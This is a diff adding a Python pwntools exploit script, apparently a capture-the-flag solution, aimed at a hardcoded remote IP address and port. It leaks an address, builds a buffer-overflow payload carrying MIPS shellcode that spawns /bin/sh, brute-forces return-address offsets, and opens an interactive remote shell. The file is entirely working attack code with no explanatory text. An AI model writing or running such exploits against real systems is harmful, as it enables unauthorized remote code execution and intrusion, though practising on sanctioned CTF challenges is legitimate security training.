@@ -1,0 +1,22 @@
+from pwn import *
+
+context(log_level="debug")
+shellcode1 = "\xff\xff\x10\x04\xab\x0f\x02\x24\x55\xf0\x46\x20\x66\x06\xff\x23\xc2\xf9\xec\x23\x66\x06\xbd\x23\x9a\xf9\xac\xaf\x9e\xf9\xa6\xaf\x9a\xf9\xbd\x23\x21\x20\x80\x01\x21\x28\xa0\x03\xcc\xcd\x44\x03/bin/sh"
+shellcode2 = "\x28\x06\xff\xff\x3c\x0f\x2f\x2f\x35\xef\x62\x69\xaf\xaf\xff\xf4\x3c\x0e\x6e\x2f\x35\xce\x73\x68\xaf\xae\xff\xf8\xaf\xa0\xff\xfc\x27\xa4\xff\xf4\x28\x05\xff\xff\x24\x02\x0f\xab\x01\x01\x01\x0c"
+for y in range(0,10):
+	for x in range(0,4):
+		try:
+			p = remote("106.75.32.60",10000)
+			p.recvuntil("lp' for  help.\n")
+			p.sendline("2057561479")
+			data = p.recvuntil("\n")[-9:-1]
+			off = int(data,16)
+			print "shellcode_addr = " +hex(off)
+			payload = "20160606 0"
+			payload += "\x00"*(0x70+y-len(shellcode2)-len(payload))+shellcode2+p32(off+29+x)
+			# payload += "\x00"*(0x74-len(shellcode2)-10)+shellcode+p32(off)
+			print  y,x
+			p.sendline(payload)
+			p.interactive()
+		except:
+			p.close()
